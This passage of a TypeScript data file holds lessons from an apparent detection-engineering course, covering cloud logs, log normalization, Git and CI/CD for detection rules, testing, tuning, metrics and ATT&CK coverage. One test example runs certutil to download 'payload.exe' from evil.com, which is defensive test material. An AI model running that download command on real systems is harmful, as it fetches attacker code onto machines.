+- Sign-in logs: Authentication events with conditional access results
+- Audit logs: Directory changes, app registrations, role assignments
+- Resource logs: Azure resource operations
+
+### GCP Audit Logs
+- Admin Activity: Always-on, captures config changes
+- Data Access: Must be enabled, captures data reads/writes
+
+## Identity Provider Logs
+
+### Okta System Log
+\`\`\`
+event.type: "user.session.start"
+event.outcome: "FAILURE"
+event.reason: "INVALID_CREDENTIALS"
+\`\`\`
+
+### Azure AD / Entra ID
+- Sign-in risk events (impossible travel, anonymous IP)
+- Conditional access policy evaluations
+- Service principal authentications
+
+## SaaS Application Logs
+
+| Platform | Key Events |
+|----------|-----------|
+| Microsoft 365 | Unified Audit Log: email rules, file sharing, eDiscovery |
+| Google Workspace | Admin SDK: login, drive sharing, app installs |
+| Slack | Audit API: file uploads, app installs, channel changes |
+| GitHub | Audit log: repo access, SSH keys, webhooks |
+
+## Detection Opportunities
+
+- **Impossible travel**: Login from NYC then Tokyo in 30 minutes
+- **MFA fatigue**: 10+ MFA prompts in 5 minutes
+- **OAuth abuse**: Suspicious app consent grants
+- **Privilege escalation**: Global admin role assignment`,
+    keyTakeaways: [
+      "AWS CloudTrail, Azure Activity Log, and GCP Audit Logs capture all API calls",
+      "Identity provider logs (Okta, Entra ID) reveal authentication attacks",
+      "SaaS audit logs capture data access, sharing, and configuration changes",
+      "Cloud-specific detections include impossible travel, MFA fatigue, and OAuth abuse"
+    ]
+  },
+  {
+    id: "4.4",
+    courseId: "detection-engineering",
+    title: "Log Normalization & Enrichment",
+    content: `# Log Normalization & Enrichment
+
+Raw logs are inconsistent. Normalization and enrichment make them detection-ready.
+
+## Why Normalize?
+
+Same event, different formats:
+\`\`\`
+Windows: "SourceIP: 10.0.0.5"
+Linux:   "src=10.0.0.5"
+Firewall: "srcaddr:10.0.0.5"
+Cloud:   "sourceIPAddress": "10.0.0.5"
+\`\`\`
+
+After normalization:
+\`\`\`
+source.ip: "10.0.0.5"
+\`\`\`
+
+## Common Information Models
+
+### Elastic Common Schema (ECS)
+\`\`\`
+process.name, process.pid, process.command_line
+source.ip, source.port
+destination.ip, destination.port
+user.name, user.domain
+file.name, file.hash.sha256
+\`\`\`
+
+### Splunk Common Information Model (CIM)
+\`\`\`
+src_ip, src_port
+dest_ip, dest_port
+user, process_name, process_id
+\`\`\`
+
+### OCSF (Open Cybersecurity Schema Framework)
+The emerging standard backed by AWS, Splunk, and others.
+
+## Enrichment Pipeline
+
+Raw Log → Parse → Normalize → Enrich → Index
+
+### Enrichment Sources
+
+| Source | Added Context |
+|--------|--------------|
+| Asset inventory | Owner, criticality, business unit |
+| Threat intel | IOC match, reputation, campaign |
+| GeoIP | Country, city, ASN |
+| User directory | Department, role, manager |
+| Vulnerability scanner | CVEs, patch status |
+
+### Example Enrichment
+
+Before:
+\`\`\`json
+{ "src_ip": "198.51.100.1", "event": "login_success" }
+\`\`\`
+
+After:
+\`\`\`json
+{
+  "src_ip": "198.51.100.1",
+  "src_geo": "Russia",
+  "src_reputation": "malicious",
+  "src_threat_intel": ["APT29_infrastructure"],
+  "user_department": "Finance",
+  "asset_criticality": "high",
+  "event": "login_success"
+}
+\`\`\`
+
+Enrichment transforms an ordinary login into a **critical alert**.`,
+    keyTakeaways: [
+      "Normalization maps diverse log formats to a common schema (ECS, CIM, OCSF)",
+      "Enrichment adds context: asset info, threat intel, GeoIP, user details",
+      "Enriched logs dramatically improve detection quality and analyst efficiency",
+      "Build enrichment pipelines at ingest time for real-time detection benefit"
+    ]
+  },
+
+  // Module 5: Detection as Code
+  {
+    id: "5.1",
+    courseId: "detection-engineering",
+    title: "Version Control for Detections",
+    content: `# Version Control for Detections
+
+Detections are code. They deserve the same engineering rigor as production software.
+
+## Why Git for Detections?
+
+- **History**: Every change is tracked with who, when, and why
+- **Review**: Pull requests ensure quality before deployment
+- **Rollback**: Instantly revert a broken detection
+- **Collaboration**: Teams work on rules simultaneously
+- **Automation**: CI/CD triggers on commits
+
+## Repository Structure
+
+\`\`\`
+detection-rules/
+├── rules/
+│   ├── windows/
+│   │   ├── process_creation/
+│   │   │   ├── win_susp_powershell_download.yml
+│   │   │   └── win_office_spawn_cmd.yml
+│   │   ├── registry/
+│   │   └── authentication/
+│   ├── linux/
+│   ├── cloud/
+│   └── network/
+├── tests/
+│   ├── true_positives/
+│   └── false_positives/
+├── pipelines/
+│   └── conversion/
+├── docs/
+│   └── playbooks/
+├── .github/
+│   └── workflows/
+└── README.md
+\`\`\`
+
+## Branching Strategy
+
+\`\`\`
+main ── (production detections)
+  └── develop ── (staging)
+        ├── feature/detect-kerberoasting
+        ├── fix/reduce-fp-certutil-rule
+        └── update/quarterly-review-q1
+\`\`\`
+
+## Pull Request Template
+
+\`\`\`markdown
+## Detection Change
+- **Rule**: [rule file name]
+- **Type**: New / Update / Deprecate
+- **ATT&CK**: T1059.001
+- **Testing**: [ ] TP validated [ ] FP tested [ ] Performance checked
+- **Playbook**: Updated? Yes/No
+\`\`\`
+
+## Commit Messages
+
+\`\`\`
+feat(windows): add T1003.001 LSASS credential dump detection
+fix(linux): reduce FPs in sudo abuse rule by excluding cron
+deprecate(network): retire legacy DNS tunnel rule (replaced by de-1045)
+\`\`\``,
+    keyTakeaways: [
+      "Store all detection rules in Git with structured directories",
+      "Use pull requests with mandatory review before production deployment",
+      "Organize rules by platform (windows/linux/cloud/network) and technique",
+      "Use conventional commits for clear change history"
+    ]
+  },
+  {
+    id: "5.2",
+    courseId: "detection-engineering",
+    title: "CI/CD Pipelines for Detection",
+    content: `# CI/CD Pipelines for Detection
+
+Automated pipelines validate, convert, and deploy detections — eliminating manual errors.
+
+## Pipeline Stages
+
+\`\`\`
+Commit → Lint → Validate → Convert → Test → Stage → Deploy → Monitor
+\`\`\`
+
+## GitHub Actions Example
+
+\`\`\`yaml
+name: Detection Pipeline
+on:
+  push:
+    paths: ['rules/**']
+  pull_request:
+    paths: ['rules/**']
+
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: YAML Lint
+        run: yamllint rules/
+      - name: SIGMA Validation
+        run: sigma check rules/
+      - name: Convert to Splunk
+        run: sigma convert -t splunk -p sysmon rules/ > output/splunk/
+      - name: Convert to Sentinel
+        run: sigma convert -t microsoft365defender rules/ > output/sentinel/
+      
+  test:
+    needs: validate
+    steps:
+      - name: Run TP Tests
+        run: python tests/run_tp_tests.py
+      - name: Run FP Tests
+        run: python tests/run_fp_tests.py
+      
+  deploy:
+    needs: test
+    if: github.ref == 'refs/heads/main'
+    steps:
+      - name: Deploy to SIEM
+        run: python deploy/push_to_siem.py
+        env:
+          SIEM_API_KEY: \${{ secrets.SIEM_API_KEY }}
+\`\`\`
+
+## Quality Gates
+
+| Gate | Criteria | Fail Action |
+|------|----------|-------------|
+| Lint | Valid YAML syntax | Block merge |
+| Schema | Required SIGMA fields present | Block merge |
+| TP Test | Rule matches test data | Block merge |
+| FP Test | Rule doesn't match benign data | Warning |
+| Performance | Query < 30s on sample data | Warning |
+| Review | 1+ approved review | Block merge |
+
+## Automated Notifications
+
+On deployment:
+- Slack: "#detection-updates: New rule deployed: T1003.001 LSASS Dump"
+- JIRA: Auto-create playbook update ticket
+- Wiki: Update ATT&CK coverage dashboard`,
+    keyTakeaways: [
+      "CI/CD pipelines automate validation, conversion, testing, and deployment",
+      "Quality gates block broken or noisy rules from reaching production",
+      "Automated conversion ensures rules stay in sync across SIEM platforms",
+      "Notifications keep SOC analysts informed of new and updated detections"
+    ]
+  },
+  {
+    id: "5.3",
+    courseId: "detection-engineering",
+    title: "Detection Testing Frameworks",
+    content: `# Detection Testing Frameworks
+
+Every detection needs proof that it works. Testing provides that proof.
+
+## Types of Detection Tests
+
+### True Positive (TP) Tests
+Simulate the attack and verify the detection fires:
+\`\`\`yaml
+test:
+  name: "Certutil URL download"
+  attack_simulation:
+    command: "certutil -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe"
+    expected_event:
+      EventID: 1
+      Image: "*\\certutil.exe"
+      CommandLine: "*urlcache*"
+  expected_result: alert_fires
+\`\`\`
+
+### True Negative (TN) Tests
+Verify legitimate activity doesn't trigger:
+\`\`\`yaml
+test:
+  name: "Certutil certificate verification (legitimate)"
+  benign_activity:
+    command: "certutil -verify C:\\certs\\server.cer"
+  expected_result: no_alert
+\`\`\`
+
+## Atomic Red Team
+
+Open-source library of small, focused tests mapped to ATT&CK:
+
+\`\`\`bash
+# Execute specific technique test
+Invoke-AtomicTest T1059.001 -TestNumbers 1
+
+# List available tests
+Invoke-AtomicTest T1059.001 -ShowDetailsBrief
+
+# Cleanup after test
+Invoke-AtomicTest T1059.001 -TestNumbers 1 -Cleanup
+\`\`\`
+
+## Detection Validation Framework
+
+\`\`\`
+For each detection rule:
+  1. Run atomic test for mapped technique
+  2. Wait for log ingestion (30-120 seconds)
+  3. Query SIEM for expected alert
+  4. Record: TP fired? Time to detect? Alert quality?
+  5. Run benign variant
+  6. Record: FP generated?
+\`\`\`
+
+## Continuous Validation
+
+Schedule automated tests:
+- **Daily**: Critical detections (credential theft, ransomware indicators)
+- **Weekly**: High-priority detections
+- **Monthly**: Full detection suite
+- **On-change**: Triggered by detection rule updates
+
+## Purple Team Integration
+
+Detection testing aligns with purple teaming:
+- Red team executes technique
+- Blue team validates detection
+- Gap? → Write or fix detection
+- Success? → Document and move to next technique`,
+    keyTakeaways: [
+      "Test every detection with both true positive and true negative cases",
+      "Atomic Red Team provides pre-built attack simulations mapped to ATT&CK",
+      "Schedule continuous validation: daily for critical, weekly for high-priority",
+      "Purple team exercises directly validate and improve detection coverage"
+    ]
+  },
+  {
+    id: "5.4",
+    courseId: "detection-engineering",
+    title: "Infrastructure as Code for SIEM",
+    content: `# Infrastructure as Code for SIEM
+
+SIEM configurations, parsers, and dashboards should be managed as code alongside detection rules.
+
+## What to Codify
+
+| Component | Tool | Benefit |
+|-----------|------|---------|
+| SIEM deployment | Terraform, CloudFormation | Repeatable infrastructure |
+| Log parsers | Custom config files in Git | Versioned parsing logic |
+| Dashboards | JSON/YAML exports | Portable visualizations |
+| Alert actions | Playbook definitions | Consistent response |
+| Data pipelines | Pipeline config files | Reproducible enrichment |
+
+## Terraform for SIEM Infrastructure
+
+\`\`\`hcl
+resource "azurerm_log_analytics_workspace" "sentinel" {
+  name                = "soc-sentinel-prod"
+  location            = "eastus"
+  resource_group_name = "soc-rg"
+  sku                 = "PerGB2018"
+  retention_in_days   = 90
+}
+
+resource "azurerm_sentinel_alert_rule_scheduled" "detection" {
+  name                       = "T1003-001-LSASS-Dump"
+  log_analytics_workspace_id = azurerm_log_analytics_workspace.sentinel.id
+  display_name               = "LSASS Memory Dump Detected"
+  severity                   = "High"
+  query                      = file("rules/windows/t1003_001_lsass.kql")
+  query_frequency            = "PT5M"
+  query_period               = "PT5M"
+  trigger_operator           = "GreaterThan"
+  trigger_threshold          = 0
+}
+\`\`\`
+
+## Configuration Management
+
+### Ansible for Log Collection
+
+\`\`\`yaml
+- name: Deploy Sysmon configuration
+  hosts: windows_servers
+  tasks:
+    - name: Copy Sysmon config
+      win_copy:
+        src: configs/sysmon-config.xml
+        dest: C:\\Windows\\sysmon-config.xml
+    - name: Update Sysmon
+      win_command: sysmon -c C:\\Windows\\sysmon-config.xml
+\`\`\`
+
+## Environment Parity
+
+Maintain identical configurations across:
+- **Dev**: Test new parsers and detections
+- **Staging**: Pre-production validation
+- **Production**: Live SOC environment
+
+\`\`\`
+configs/
+├── dev/
+├── staging/
+└── production/
+\`\`\`
+
+## Benefits
+
+- **Disaster recovery**: Rebuild entire SIEM from code
+- **Auditing**: Every config change tracked in Git
+- **Onboarding**: New team members understand setup from code
+- **Consistency**: No drift between environments`,
+    keyTakeaways: [
+      "Manage SIEM infrastructure, parsers, and dashboards as code",
+      "Terraform and Ansible automate SIEM deployment and configuration",
+      "Maintain dev/staging/production parity for reliable testing",
+      "IaC enables disaster recovery, auditing, and environment consistency"
+    ]
+  },
+
+  // Module 6: Detection Operations
+  {
+    id: "6.1",
+    courseId: "detection-engineering",
+    title: "Detection Tuning & Optimization",
+    content: `# Detection Tuning & Optimization
+
+Tuning is an ongoing discipline that separates production-grade detections from noise generators.
+
+## The Tuning Process
+
+### Phase 1: Initial Deployment (Week 1)
+- Deploy in **alert-only** mode (no automated response)
+- Review every single alert manually
+- Categorize: True Positive, False Positive, Benign True Positive
+
+### Phase 2: First Tuning (Week 2)
+- Add exclusions for common FP patterns
+- Adjust thresholds based on observed volumes
+- Refine field selections
+
+### Phase 3: Validation (Weeks 3-4)
+- Monitor FP rate — target <5%
+- Validate TP detection still works after tuning
+- Get SOC analyst feedback
+
+### Phase 4: Production (Week 5+)
+- Enable full alerting and automated actions
+- Ongoing monitoring with monthly review
+
+## Common Tuning Techniques
+
+### Allowlisting
+\`\`\`yaml
+filter_legitimate:
+  User|endswith:
+    - '$'           # Machine accounts
+  Image|contains:
+    - '\\sccm\\'    # SCCM agent
+    - '\\msiexec'   # Legitimate installers
+\`\`\`
+
+### Threshold Adjustment
+\`\`\`
+Before: count() > 3 in 5 minutes  → 50 FPs/day
+After:  count() > 10 in 5 minutes → 2 FPs/day
+\`\`\`
+
+### Time-Based Filtering
+Exclude scheduled maintenance windows, known backup jobs, patching cycles.
+
+### Context-Based Scoring
+Add weight based on:
+- Asset criticality (server vs workstation)
+- User risk score (admin vs standard)
+- Network zone (DMZ vs internal)
+
+## When to Disable vs Tune
+
+| Scenario | Action |
+|----------|--------|
+| FP rate >50%, pattern unclear | Disable, investigate root cause |
+| FP rate 10-50%, pattern identified | Tune with exclusions |
+| FP rate 5-10%, manageable | Minor threshold adjustment |
+| FP rate <5% | Production ready |`,
+    keyTakeaways: [
+      "Deploy detections in alert-only mode and tune over 4-week phases",
+      "Use allowlisting, thresholds, time filters, and context scoring to reduce FPs",
+      "Target <5% FP rate before enabling full production alerting",
+      "Disable rules with >50% FP rate and unclear patterns immediately"
+    ]
+  },
+  {
+    id: "6.2",
+    courseId: "detection-engineering",
+    title: "Detection Metrics & KPIs",
+    content: `# Detection Metrics & KPIs
+
+Metrics prove the value of detection engineering and guide improvement efforts.
+
+## Core Metrics
+
+### Detection Coverage
+\`\`\`
+ATT&CK Coverage = Techniques with detections / Total relevant techniques
+Target: >60% of priority techniques
+\`\`\`
+
+### Detection Quality
+| Metric | Formula | Target |
+|--------|---------|--------|
+| FP Rate | FPs / Total Alerts | <5% per rule |
+| TP Rate | Confirmed TPs / Total Alerts | >80% |
+| Mean Time to Detect (MTTD) | Avg time from activity to alert | <15 min |
+| Alert Fidelity | Actionable / Total Alerts | >70% |
+
+### Detection Engineering Velocity
+| Metric | Description | Target |
+|--------|-------------|--------|
+| Rules shipped/month | New production detections | 8-12 |
+| Rules tuned/month | Existing rules improved | 15-20 |
+| Rules retired/month | Obsolete rules removed | 2-5 |
+| Mean time to production | Idea to deployed detection | <2 weeks |
+
+## Tracking Dashboard
+
+Build a dashboard showing:
+1. **Coverage heat map**: ATT&CK Navigator with detection scores
+2. **Alert quality trend**: FP rate over time per rule category
+3. **Pipeline velocity**: Backlog → Production flow
+4. **Top noisy rules**: Rules generating most FPs
+5. **Gap analysis**: Priority techniques without detections
+
+## Reporting to Leadership
+
+Monthly detection engineering report:
+- **Coverage delta**: +X techniques covered this month
+- **Quality improvement**: FP rate reduced from X% to Y%
+- **Threats detected**: Real incidents caught by new detections
+- **Efficiency gains**: Analyst time saved through tuning
+- **Investment needs**: Data sources, tools, training gaps
+
+## Benchmarking
+
+Compare against industry:
+- Average enterprise: 20-30% ATT&CK coverage
+- Mature program: 50-70% coverage
+- Elite program: 70-90% coverage with continuous validation`,
+    keyTakeaways: [
+      "Track coverage (ATT&CK %), quality (FP rate), and velocity (rules shipped/month)",
+      "Target >60% ATT&CK coverage of priority techniques",
+      "Build dashboards showing coverage heat maps, quality trends, and pipeline velocity",
+      "Report to leadership with coverage delta, quality improvements, and threats detected"
+    ]
+  },
+  {
+    id: "6.3",
+    courseId: "detection-engineering",
+    title: "ATT&CK Coverage Mapping",
+    content: `# ATT&CK Coverage Mapping
+
+Systematic coverage mapping turns MITRE ATT&CK from a reference into an **operational tool**.
+
+## Coverage Scoring Model
+
+| Score | Level | Definition |
+|-------|-------|------------|
+| 0 | None | No detection capability |
+| 1 | Minimal | IOC-based only, easily evaded |
+| 2 | Partial | Behavioral detection, some variants missed |
+| 3 | Good | Multiple detection approaches, most variants caught |
+| 4 | Excellent | Comprehensive detection with validation |
+
+## ATT&CK Navigator
+
+The MITRE ATT&CK Navigator creates visual heat maps:
+
+\`\`\`json
+{
+  "name": "Detection Coverage Q1 2024",
+  "versions": { "attack": "14" },
+  "techniques": [
+    {
+      "techniqueID": "T1059.001",
+      "score": 3,
+      "comment": "SIGMA rules DE-101, DE-102. Validated weekly.",
+      "color": "#00FF00"
+    },
+    {
+      "techniqueID": "T1003.001",
+      "score": 1,
+      "comment": "Hash-based only. Needs behavioral detection.",
+      "color": "#FF6600"
+    }
+  ]
+}
+\`\`\`
+
+## Building a Coverage Map
+
+### Step 1: Define Threat Profile
+Which adversary groups target your industry?
+- Financial: APT38, FIN7, Carbanak
+- Healthcare: APT41, Ryuk operators
+- Government: APT29, APT28, Lazarus
+
+### Step 2: Extract Techniques
+Pull techniques used by those groups from ATT&CK.
+
+### Step 3: Assess Current Coverage
+For each technique: What detections exist? What data sources feed them?
+
+### Step 4: Prioritize Gaps
+Score by: threat relevance × impact × feasibility of detection.
+
+### Step 5: Build Roadmap
+Create quarterly detection engineering backlog from prioritized gaps.
+
+## Layered Coverage
+
+Best practice: **multiple detections per technique** using different data sources.
+
+\`\`\`
+T1059.001 (PowerShell):
+├── Detection 1: Sysmon process creation (command line)
+├── Detection 2: PowerShell Script Block Logging
+├── Detection 3: Network — beacon pattern to C2
+└── Detection 4: EDR — memory scanning for encoded payloads
+\`\`\`
+
+If one data source fails, others still detect the technique.`,
+    keyTakeaways: [
+      "Score detection coverage 0-4 for each relevant ATT&CK technique",
+      "Use ATT&CK Navigator to create visual coverage heat maps",
+      "Prioritize gaps by threat relevance, impact, and detection feasibility",
+      "Layer multiple detections per technique across different data sources"
+    ]
+  },
+  {
+    id: "6.4",
+    courseId: "detection-engineering",
+    title: "Detection Lifecycle Management",
+    content: `# Detection Lifecycle Management
+
+Detections require ongoing maintenance — set it and forget it leads to detection decay.
+
+## Detection Decay
+
+Over time, detections lose effectiveness:
+- **Environment changes**: New applications, infrastructure migrations
+- **Adversary evolution**: Attackers modify techniques to evade detection
+- **Data source drift**: Log formats change, new fields appear
+- **Configuration drift**: SIEM updates break queries
+
+## Review Cadence
+
+| Review Type | Frequency | Focus |
+|-------------|-----------|-------|
+| Alert quality | Weekly | FP rate, analyst feedback |
+| Rule performance | Monthly | Query time, resource usage |
+| Coverage assessment | Quarterly | ATT&CK gaps, new techniques |
+| Full audit | Annually | Complete rule inventory review |
+
+## Detection Health Checks
+
+For each production rule, verify:
+1. **Still firing?** — Rules with zero hits may indicate broken data pipelines
+2. **Still accurate?** — Test with current attack simulation
+3. **Still needed?** — Is the technique still relevant?
+4. **Still performant?** — Query execution time within limits?
+5. **Documentation current?** — Playbook matches current rule logic?
+
+## Retirement Process
+
+When to retire a detection:
+- Technique no longer relevant to threat profile
+- Replaced by a better detection
+- Data source deprecated
+- Consistently high FP rate despite tuning
+
+Retirement steps:
+1. Document reason for retirement
+2. Verify replacement coverage exists (if applicable)
+3. Disable rule (don't delete — archive)
+4. Update ATT&CK coverage map
+5. Notify SOC team
+
+## Continuous Improvement Cycle
+
+\`\`\`
+Threat Intel → Gap Analysis → Backlog → Build → Test → Deploy → Monitor → Review → Retire
+                    ↑                                                          |
+                    └──────────────────────────────────────────────────────────┘
+\`\`\`
+
+## Building a Detection Engineering Program
+
+### Maturity Levels
+| Level | Characteristics |
+|-------|----------------|
+| 1 - Ad-hoc | Individual analysts write rules as needed |
+| 2 - Defined | Documented process, shared repository |
+| 3 - Managed | CI/CD pipeline, testing, metrics |
+| 4 - Optimized | Continuous validation, automated coverage tracking |
+| 5 - Leading | Threat-informed, purple team integrated, ML-augmented |
+
+Start wherever you are and improve incrementally. Every organization can reach Level 3 with discipline and commitment.`,
+    keyTakeaways: [
+      "Detections decay over time — regular review cadence is essential",
+      "Check detection health: still firing, accurate, needed, performant, documented?",
+      "Retire detections formally: document, verify replacement, archive, update coverage",
+      "Build program maturity from ad-hoc (Level 1) to leading (Level 5) incrementally"
+    ]
+  },
 ];
 
 export const getLessonContent = (courseId: string, lessonId: string): LessonContent | undefined => {
